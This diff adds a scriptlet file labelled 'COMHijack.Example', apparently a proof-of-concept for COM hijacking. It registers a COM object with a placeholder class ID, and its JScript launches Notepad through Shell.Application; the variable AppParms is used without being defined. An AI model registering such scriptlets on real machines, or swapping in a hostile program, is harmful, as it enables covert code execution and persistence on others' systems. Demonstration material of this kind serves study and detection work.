@@ -1,0 +1,21 @@
+<?XML version="1.0"?>
+<scriptlet>
+ 
+<registration
+    description="COMHijack.Example"
+    progid="COMHijack.Example"
+    version="1"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+    >
+</registration>
+ 
+<script language="JScript">
+<![CDATA[
+    var ObjShell = new ActiveXObject("Shell.Application");
+    var AppToRun = "Notepad.exe";
+    ObjShell.ShellExecute(AppToRun, AppParms, "", "Open","1");
+]]>
+</script>
+ 
+</scriptlet>
